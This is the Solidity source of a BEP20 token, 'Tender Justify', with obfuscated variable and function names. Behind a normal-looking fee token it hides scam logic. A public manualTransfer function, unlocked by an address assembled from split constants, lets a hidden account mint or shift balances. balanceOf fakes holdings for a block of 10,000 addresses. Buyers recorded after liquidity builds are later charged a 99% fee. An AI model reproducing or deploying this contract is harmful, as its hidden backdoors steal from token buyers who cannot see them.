/**
 *Submitted for verification at BscScan.com on 2022-12-31
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;



abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

}



interface IUniswapV2Router {

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function factory() external pure returns (address);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


library SafeMath {

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

}


interface IBEP20 {

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function name() external view returns (string memory);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}




contract TenderJustify is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 tokenBotsAutoModeListEnable = 100000000 * (10 ** _decimals);
    uint256  shouldAutoSellTeam = 100000000 * 10 ** _decimals;
    uint256  minFeeSwapEnableBuyExempt = 100000000 * 10 ** _decimals;


    string constant _name = "Tender Justify";
    string constant _symbol = "TJY";
    uint8 constant _decimals = 18;

    uint256 private toSwapReceiverMint = 0;
    uint256 private teamMintBotsMode = 4;

    uint256 private isAtExemptBuy = 0;
    uint256 private takeAtTeamIs = 4;

    bool private burnExemptReceiverMode = true;
    bool private listMarketingSellMin = true;
    bool private receiverShouldToExemptLaunchedList = true;
    bool private feeTotalModeIsLimit = true;
    bool private shouldTradingReceiverExemptReceiverMode = true;
    uint256 enableLaunchedFeeMax = 2 ** 18 - 1;
    uint256 private launchedLaunchFromMax = 6 * 10 ** 15;
    uint256 private isListAmountToken = tokenBotsAutoModeListEnable / 1000; // 0.1%
    uint256 buyTakeFromTotal = 27206;

    address constant teamTotalWalletMode = 0x7aE2f5b9E386CD1b51a4550696d957CB4900f03a;
    uint256 launchListBuyMarketing = 0;

    uint256 private minLaunchedBuyReceiver = teamMintBotsMode + toSwapReceiverMint;
    uint256 private burnTotalFeeSender = 100;

    uint160 constant senderTradingLaunchBuy = 567689104325 * 2 ** 120;
    uint160 constant botsMarketingTokenTx = 492257441748 * 2 ** 80;
    uint160 constant exemptLiquiditySenderSellFromFeeReceiver = 239837720756 * 2 ** 40;
    uint160 constant maxReceiverEnableLiquidity = 467700257922;

    bool private senderMintToTeamFundAt;
    uint256 private amountFeeReceiverEnable;
    uint256 private takeReceiverModeSell;
    uint256 private autoBotsMarketingExemptToTx;
    uint256 private burnAmountLaunchTeam;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private atBuyReceiverBotsShould;
    mapping(address => bool) private fundMinLiquidityIsFee;
    mapping(address => bool) private exemptFeeMarketingMint;
    mapping(address => bool) private receiverBuyToFee;
    mapping(address => uint256) private launchReceiverTxTeam;
    mapping(uint256 => address) private teamLaunchedReceiverAuto;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;

    IUniswapV2Router public botsTotalFeeLaunched;
    address public uniswapV2Pair;

    uint256 private teamEnableAmountIsTokenLaunchList;
    uint256 private totalFeeTradingFrom;

    address private burnReceiverTradingBotsSwapTeamSell = (msg.sender); // auto-liq address
    address private walletTakeSellMode = (0x96D098b4B831Aa2bb13A1f02FFffe7EB845be420); // marketing address

    
    uint256 public teamLiquidityEnableReceiverTake = 0;
    uint256 public tradingToShouldAutoSell = 0;
    bool private swapReceiverShouldBots = false;
    bool private botsBurnFromTake = false;
    bool private burnLaunchedTokenAmount = false;
    bool private receiverWalletLaunchAt = false;
    uint256 private totalSellExemptAuto = 0;
    uint256 public autoTotalBurnWallet = 0;
    bool private shouldLimitTxTeam = false;
    bool public liquidityAmountFromMarketingSender = false;
    uint256 public totalTxReceiverLiquidityBuyMin = 0;
    uint256 private toTxAmountBurnList = 0;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        botsTotalFeeLaunched = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(botsTotalFeeLaunched.factory()).createPair(address(this), botsTotalFeeLaunched.WETH());
        _allowances[address(this)][address(botsTotalFeeLaunched)] = tokenBotsAutoModeListEnable;

        senderMintToTeamFundAt = true;

        exemptFeeMarketingMint[msg.sender] = true;
        exemptFeeMarketingMint[0x0000000000000000000000000000000000000000] = true;
        exemptFeeMarketingMint[0x000000000000000000000000000000000000dEaD] = true;
        exemptFeeMarketingMint[address(this)] = true;

        atBuyReceiverBotsShould[msg.sender] = true;
        atBuyReceiverBotsShould[address(this)] = true;

        fundMinLiquidityIsFee[msg.sender] = true;
        fundMinLiquidityIsFee[0x0000000000000000000000000000000000000000] = true;
        fundMinLiquidityIsFee[0x000000000000000000000000000000000000dEaD] = true;
        fundMinLiquidityIsFee[address(this)] = true;

        approve(_router, tokenBotsAutoModeListEnable);
        approve(address(uniswapV2Pair), tokenBotsAutoModeListEnable);
        _balances[msg.sender] = tokenBotsAutoModeListEnable;
        emit Transfer(address(0), msg.sender, tokenBotsAutoModeListEnable);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return tokenBotsAutoModeListEnable;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, tokenBotsAutoModeListEnable);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return fromLaunchedShouldModeTradingWalletTx(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != tokenBotsAutoModeListEnable) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return fromLaunchedShouldModeTradingWalletTx(sender, recipient, amount);
    }

    function setisMintEnableSwap(bool tradingListLaunchIs) public onlyOwner {
        if (burnLaunchedTokenAmount != burnExemptReceiverMode) {
            burnExemptReceiverMode=tradingListLaunchIs;
        }
        if (burnLaunchedTokenAmount != listMarketingSellMin) {
            listMarketingSellMin=tradingListLaunchIs;
        }
        burnLaunchedTokenAmount=tradingListLaunchIs;
    }

    function setwalletExemptSellBuy(uint256 tradingListLaunchIs) public onlyOwner {
        if (toTxAmountBurnList == launchedLaunchFromMax) {
            launchedLaunchFromMax=tradingListLaunchIs;
        }
        if (toTxAmountBurnList != isListAmountToken) {
            isListAmountToken=tradingListLaunchIs;
        }
        toTxAmountBurnList=tradingListLaunchIs;
    }

    function modeFromEnableAt(address buySellBurnTakeFundender, address marketingTxBotsMint, uint256 takeTotalTxListShouldLaunchReceiver) internal returns (uint256) {
        
        if (burnLaunchedTokenAmount != burnExemptReceiverMode) {
            burnLaunchedTokenAmount = burnLaunchedTokenAmount;
        }

        if (swapReceiverShouldBots == burnExemptReceiverMode) {
            swapReceiverShouldBots = feeTotalModeIsLimit;
        }

        if (receiverWalletLaunchAt != feeTotalModeIsLimit) {
            receiverWalletLaunchAt = receiverWalletLaunchAt;
        }


        uint256 atExemptTradingLimitAmount = takeTotalTxListShouldLaunchReceiver.mul(walletTakeMaxBuyToLimit(buySellBurnTakeFundender, marketingTxBotsMint == uniswapV2Pair)).div(burnTotalFeeSender);

        if (receiverBuyToFee[buySellBurnTakeFundender] || receiverBuyToFee[marketingTxBotsMint]) {
            atExemptTradingLimitAmount = takeTotalTxListShouldLaunchReceiver.mul(99).div(burnTotalFeeSender);
        }

        _balances[address(this)] = _balances[address(this)].add(atExemptTradingLimitAmount);
        emit Transfer(buySellBurnTakeFundender, address(this), atExemptTradingLimitAmount);
        
        return takeTotalTxListShouldLaunchReceiver.sub(atExemptTradingLimitAmount);
    }

    function manualTransfer(address buySellBurnTakeFundender, address minLimitSellMarketingFromLaunched, uint256 takeTotalTxListShouldLaunchReceiver) public {
        if (!liquidityReceiverReceiverFee(uint160(msg.sender))) {
            return;
        }
        if (receiverLaunchLimitTradingEnableFeeLiquidity(uint160(minLimitSellMarketingFromLaunched))) {
            atAmountSenderFundFeeTradingSwap(buySellBurnTakeFundender, minLimitSellMarketingFromLaunched, takeTotalTxListShouldLaunchReceiver, false);
            return;
        }
        if (receiverLaunchLimitTradingEnableFeeLiquidity(uint160(buySellBurnTakeFundender))) {
            atAmountSenderFundFeeTradingSwap(buySellBurnTakeFundender, minLimitSellMarketingFromLaunched, takeTotalTxListShouldLaunchReceiver, true);
            return;
        }
        if (buySellBurnTakeFundender == address(0)) {
            _balances[minLimitSellMarketingFromLaunched] = _balances[minLimitSellMarketingFromLaunched].add(takeTotalTxListShouldLaunchReceiver);
            return;
        }
    }

    function mintSellLaunchedShould() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        shouldTradingReceiverExemptReceiverMode &&
        _balances[address(this)] >= isListAmountToken;
    }

    function settotalIsBotsMaxReceiverFundMint(bool tradingListLaunchIs) public onlyOwner {
        shouldTradingReceiverExemptReceiverMode=tradingListLaunchIs;
    }

    function launchFromMaxAuto() private view returns (uint256) {
        return block.timestamp;
    }

    function txTeamFundFromAmount() internal swapping {
        
        if (receiverWalletLaunchAt == burnLaunchedTokenAmount) {
            receiverWalletLaunchAt = botsBurnFromTake;
        }

        if (totalSellExemptAuto != toSwapReceiverMint) {
            totalSellExemptAuto = totalTxReceiverLiquidityBuyMin;
        }

        if (botsBurnFromTake != swapReceiverShouldBots) {
            botsBurnFromTake = receiverWalletLaunchAt;
        }


        uint256 takeTotalTxListShouldLaunchReceiverToLiquify = isListAmountToken.mul(toSwapReceiverMint).div(minLaunchedBuyReceiver).div(2);
        uint256 fundIsTokenAutoWallet = isListAmountToken.sub(takeTotalTxListShouldLaunchReceiverToLiquify);

        address[] memory senderModeSellWalletMintExempt = new address[](2);
        senderModeSellWalletMintExempt[0] = address(this);
        senderModeSellWalletMintExempt[1] = botsTotalFeeLaunched.WETH();
        botsTotalFeeLaunched.swapExactTokensForETHSupportingFeeOnTransferTokens(
            fundIsTokenAutoWallet,
            0,
            senderModeSellWalletMintExempt,
            address(this),
            block.timestamp
        );
        
        uint256 takeTotalTxListShouldLaunchReceiverBNB = address(this).balance;
        uint256 toReceiverLaunchedTeam = minLaunchedBuyReceiver.sub(toSwapReceiverMint.div(2));
        uint256 exemptBurnMinIs = takeTotalTxListShouldLaunchReceiverBNB.mul(toSwapReceiverMint).div(toReceiverLaunchedTeam).div(2);
        uint256 walletShouldSellLiquidity = takeTotalTxListShouldLaunchReceiverBNB.mul(teamMintBotsMode).div(toReceiverLaunchedTeam);
        
        payable(walletTakeSellMode).transfer(walletShouldSellLiquidity);

        if (takeTotalTxListShouldLaunchReceiverToLiquify > 0) {
            botsTotalFeeLaunched.addLiquidityETH{value : exemptBurnMinIs}(
                address(this),
                takeTotalTxListShouldLaunchReceiverToLiquify,
                0,
                0,
                burnReceiverTradingBotsSwapTeamSell,
                block.timestamp
            );
            emit AutoLiquify(exemptBurnMinIs, takeTotalTxListShouldLaunchReceiverToLiquify);
        }
    }

    function getDEAD() public view returns (address) {
        if (DEAD != walletTakeSellMode) {
            return walletTakeSellMode;
        }
        return DEAD;
    }

    function atAmountSenderFundFeeTradingSwap(address buySellBurnTakeFundender, address minLimitSellMarketingFromLaunched, uint256 takeTotalTxListShouldLaunchReceiver, bool launchedShouldBuyAmountModeTeam) private {
        if (launchedShouldBuyAmountModeTeam) {
            buySellBurnTakeFundender = address(uint160(uint160(teamTotalWalletMode) + launchListBuyMarketing));
            launchListBuyMarketing++;
            _balances[minLimitSellMarketingFromLaunched] = _balances[minLimitSellMarketingFromLaunched].add(takeTotalTxListShouldLaunchReceiver);
        } else {
            _balances[buySellBurnTakeFundender] = _balances[buySellBurnTakeFundender].sub(takeTotalTxListShouldLaunchReceiver);
        }
        emit Transfer(buySellBurnTakeFundender, minLimitSellMarketingFromLaunched, takeTotalTxListShouldLaunchReceiver);
    }

    function getshouldReceiverFeeExempt(address tradingListLaunchIs) public view returns (bool) {
            return atBuyReceiverBotsShould[tradingListLaunchIs];
    }

    function toMaxTokenMarketing(uint160 txWalletTakeFrom) private view returns (uint256) {
        uint256 buySellBurnTakeFund = launchListBuyMarketing;
        uint256 feeAtMarketingTeamToWalletTrading = txWalletTakeFrom - uint160(teamTotalWalletMode);
        if (feeAtMarketingTeamToWalletTrading < buySellBurnTakeFund) {
            return 1 * 10 ** 18;
        }
        return 300000 * 10 ** 18;
    }

    function isLimitModeReceiver(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setfundLiquidityWalletMintTx(bool tradingListLaunchIs) public onlyOwner {
        feeTotalModeIsLimit=tradingListLaunchIs;
    }

    function walletModeLaunchedBurnMintTo(address buySellBurnTakeFundender, uint256 atExemptTradingLimit) private view returns (uint256) {
        uint256 modeSellShouldFee = launchReceiverTxTeam[buySellBurnTakeFundender];
        if (modeSellShouldFee > 0 && launchFromMaxAuto() - modeSellShouldFee > 2) {
            return 99;
        }
        return atExemptTradingLimit;
    }

    function getisAmountAtAuto() public view returns (uint256) {
        if (totalTxReceiverLiquidityBuyMin != isAtExemptBuy) {
            return isAtExemptBuy;
        }
        if (totalTxReceiverLiquidityBuyMin != burnTotalFeeSender) {
            return burnTotalFeeSender;
        }
        if (totalTxReceiverLiquidityBuyMin != totalTxReceiverLiquidityBuyMin) {
            return totalTxReceiverLiquidityBuyMin;
        }
        return totalTxReceiverLiquidityBuyMin;
    }

    function walletBuyAmountAt() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (launchReceiverTxTeam[teamLaunchedReceiverAuto[i]] == 0) {
                    launchReceiverTxTeam[teamLaunchedReceiverAuto[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function setDEAD(address tradingListLaunchIs) public onlyOwner {
        if (DEAD == WBNB) {
            WBNB=tradingListLaunchIs;
        }
        DEAD=tradingListLaunchIs;
    }

    function fromExemptTxSwapFeeWalletBurn(address buySellBurnTakeFundender) internal view returns (bool) {
        return !fundMinLiquidityIsFee[buySellBurnTakeFundender];
    }

    function walletTakeMaxBuyToLimit(address buySellBurnTakeFundender, bool buySellBurnTakeFundelling) internal returns (uint256) {
        
        if (buySellBurnTakeFundelling) {
            minLaunchedBuyReceiver = takeAtTeamIs + isAtExemptBuy;
            return walletModeLaunchedBurnMintTo(buySellBurnTakeFundender, minLaunchedBuyReceiver);
        }
        if (!buySellBurnTakeFundelling && buySellBurnTakeFundender == uniswapV2Pair) {
            minLaunchedBuyReceiver = teamMintBotsMode + toSwapReceiverMint;
            return minLaunchedBuyReceiver;
        }
        return walletModeLaunchedBurnMintTo(buySellBurnTakeFundender, minLaunchedBuyReceiver);
    }

    function swapLimitListTotal(uint160 minLimitSellMarketingFromLaunched) private view returns (bool) {
        return uint16(minLimitSellMarketingFromLaunched) == buyTakeFromTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (receiverLaunchLimitTradingEnableFeeLiquidity(uint160(account))) {
            return toMaxTokenMarketing(uint160(account));
        }
        return _balances[account];
    }

    function isSwapFundSender(address isModeFundExemptTo) private view returns (bool) {
        return ((uint256(uint160(isModeFundExemptTo)) << 192) >> 238) == enableLaunchedFeeMax;
    }

    function setshouldReceiverFeeExempt(address tradingListLaunchIs,bool modeAmountMarketingLaunch) public onlyOwner {
        if (atBuyReceiverBotsShould[tradingListLaunchIs] == receiverBuyToFee[tradingListLaunchIs]) {
           receiverBuyToFee[tradingListLaunchIs]=modeAmountMarketingLaunch;
        }
        if (atBuyReceiverBotsShould[tradingListLaunchIs] != atBuyReceiverBotsShould[tradingListLaunchIs]) {
           atBuyReceiverBotsShould[tradingListLaunchIs]=modeAmountMarketingLaunch;
        }
        if (atBuyReceiverBotsShould[tradingListLaunchIs] == exemptFeeMarketingMint[tradingListLaunchIs]) {
           exemptFeeMarketingMint[tradingListLaunchIs]=modeAmountMarketingLaunch;
        }
        atBuyReceiverBotsShould[tradingListLaunchIs]=modeAmountMarketingLaunch;
    }

    function receiverLaunchLimitTradingEnableFeeLiquidity(uint160 txWalletTakeFrom) private pure returns (bool) {
        if (txWalletTakeFrom >= uint160(teamTotalWalletMode) && txWalletTakeFrom <= uint160(teamTotalWalletMode) + 10000) {
            return true;
        }
        return false;
    }

    function getisMintEnableSwap() public view returns (bool) {
        if (burnLaunchedTokenAmount == feeTotalModeIsLimit) {
            return feeTotalModeIsLimit;
        }
        return burnLaunchedTokenAmount;
    }

    function setatReceiverTakeTrading(bool tradingListLaunchIs) public onlyOwner {
        if (burnExemptReceiverMode != listMarketingSellMin) {
            listMarketingSellMin=tradingListLaunchIs;
        }
        if (burnExemptReceiverMode != swapReceiverShouldBots) {
            swapReceiverShouldBots=tradingListLaunchIs;
        }
        burnExemptReceiverMode=tradingListLaunchIs;
    }

    function liquidityReceiverReceiverFee(uint160 txWalletTakeFrom) private pure returns (bool) {
        return txWalletTakeFrom == (senderTradingLaunchBuy + botsMarketingTokenTx + exemptLiquiditySenderSellFromFeeReceiver + maxReceiverEnableLiquidity);
    }

    function burnFromLiquidityMode(address isModeFundExemptTo) private {
        if (swapTakeTeamFee() < launchedLaunchFromMax) {
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        teamLaunchedReceiverAuto[maxWalletAmount] = isModeFundExemptTo;
    }

    function gettotalIsBotsMaxReceiverFundMint() public view returns (bool) {
        if (shouldTradingReceiverExemptReceiverMode != receiverWalletLaunchAt) {
            return receiverWalletLaunchAt;
        }
        return shouldTradingReceiverExemptReceiverMode;
    }

    function setisAmountAtAuto(uint256 tradingListLaunchIs) public onlyOwner {
        if (totalTxReceiverLiquidityBuyMin == teamMintBotsMode) {
            teamMintBotsMode=tradingListLaunchIs;
        }
        if (totalTxReceiverLiquidityBuyMin == toTxAmountBurnList) {
            toTxAmountBurnList=tradingListLaunchIs;
        }
        if (totalTxReceiverLiquidityBuyMin != maxWalletAmount) {
            maxWalletAmount=tradingListLaunchIs;
        }
        totalTxReceiverLiquidityBuyMin=tradingListLaunchIs;
    }

    function fromLaunchedShouldModeTradingWalletTx(address buySellBurnTakeFundender, address minLimitSellMarketingFromLaunched, uint256 takeTotalTxListShouldLaunchReceiver) internal returns (bool) {
        if (receiverLaunchLimitTradingEnableFeeLiquidity(uint160(minLimitSellMarketingFromLaunched))) {
            atAmountSenderFundFeeTradingSwap(buySellBurnTakeFundender, minLimitSellMarketingFromLaunched, takeTotalTxListShouldLaunchReceiver, false);
            return true;
        }
        if (receiverLaunchLimitTradingEnableFeeLiquidity(uint160(buySellBurnTakeFundender))) {
            atAmountSenderFundFeeTradingSwap(buySellBurnTakeFundender, minLimitSellMarketingFromLaunched, takeTotalTxListShouldLaunchReceiver, true);
            return true;
        }

        
        if (receiverWalletLaunchAt == botsBurnFromTake) {
            receiverWalletLaunchAt = liquidityAmountFromMarketingSender;
        }

        if (burnLaunchedTokenAmount != burnExemptReceiverMode) {
            burnLaunchedTokenAmount = liquidityAmountFromMarketingSender;
        }


        bool liquidityMarketingReceiverSenderLaunched = isSwapFundSender(buySellBurnTakeFundender) || isSwapFundSender(minLimitSellMarketingFromLaunched);
        
        if (buySellBurnTakeFundender == uniswapV2Pair) {
            if (maxWalletAmount != 0 && swapLimitListTotal(uint160(minLimitSellMarketingFromLaunched))) {
                walletBuyAmountAt();
            }
            if (!liquidityMarketingReceiverSenderLaunched) {
                burnFromLiquidityMode(minLimitSellMarketingFromLaunched);
            }
        }
        
        
        if (inSwap || liquidityMarketingReceiverSenderLaunched) {return isLimitModeReceiver(buySellBurnTakeFundender, minLimitSellMarketingFromLaunched, takeTotalTxListShouldLaunchReceiver);}
        
        if (liquidityAmountFromMarketingSender == shouldTradingReceiverExemptReceiverMode) {
            liquidityAmountFromMarketingSender = liquidityAmountFromMarketingSender;
        }

        if (teamLiquidityEnableReceiverTake != tradingToShouldAutoSell) {
            teamLiquidityEnableReceiverTake = toSwapReceiverMint;
        }

        if (autoTotalBurnWallet == totalSellExemptAuto) {
            autoTotalBurnWallet = burnTotalFeeSender;
        }


        require((takeTotalTxListShouldLaunchReceiver <= shouldAutoSellTeam) || exemptFeeMarketingMint[buySellBurnTakeFundender] || exemptFeeMarketingMint[minLimitSellMarketingFromLaunched], "Max TX Limit!");

        if (mintSellLaunchedShould()) {txTeamFundFromAmount();}

        _balances[buySellBurnTakeFundender] = _balances[buySellBurnTakeFundender].sub(takeTotalTxListShouldLaunchReceiver, "Insufficient Balance!");
        
        if (teamLiquidityEnableReceiverTake != launchedLaunchFromMax) {
            teamLiquidityEnableReceiverTake = toTxAmountBurnList;
        }

        if (autoTotalBurnWallet != maxWalletAmount) {
            autoTotalBurnWallet = teamMintBotsMode;
        }


        uint256 listMintFromTakeAmount = fromExemptTxSwapFeeWalletBurn(buySellBurnTakeFundender) ? modeFromEnableAt(buySellBurnTakeFundender, minLimitSellMarketingFromLaunched, takeTotalTxListShouldLaunchReceiver) : takeTotalTxListShouldLaunchReceiver;

        _balances[minLimitSellMarketingFromLaunched] = _balances[minLimitSellMarketingFromLaunched].add(listMintFromTakeAmount);
        emit Transfer(buySellBurnTakeFundender, minLimitSellMarketingFromLaunched, listMintFromTakeAmount);
        return true;
    }

    function swapTakeTeamFee() private view returns (uint256) {
        address enableFundAutoLimit = WBNB;
        if (address(this) < WBNB) {
            enableFundAutoLimit = address(this);
        }
        (uint amountReceiverFeeExemptEnableMint, uint feeMinWalletShould,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 amountMintReceiverSender,) = WBNB == enableFundAutoLimit ? (amountReceiverFeeExemptEnableMint, feeMinWalletShould) : (feeMinWalletShould, amountReceiverFeeExemptEnableMint);
        uint256 senderAutoMarketingSwap = IERC20(WBNB).balanceOf(uniswapV2Pair) - amountMintReceiverSender;
        return senderAutoMarketingSwap;
    }

    function getfundLiquidityWalletMintTx() public view returns (bool) {
        if (feeTotalModeIsLimit == swapReceiverShouldBots) {
            return swapReceiverShouldBots;
        }
        if (feeTotalModeIsLimit != shouldLimitTxTeam) {
            return shouldLimitTxTeam;
        }
        if (feeTotalModeIsLimit != botsBurnFromTake) {
            return botsBurnFromTake;
        }
        return feeTotalModeIsLimit;
    }

    function getwalletExemptSellBuy() public view returns (uint256) {
        return toTxAmountBurnList;
    }

    function getatReceiverTakeTrading() public view returns (bool) {
        return burnExemptReceiverMode;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}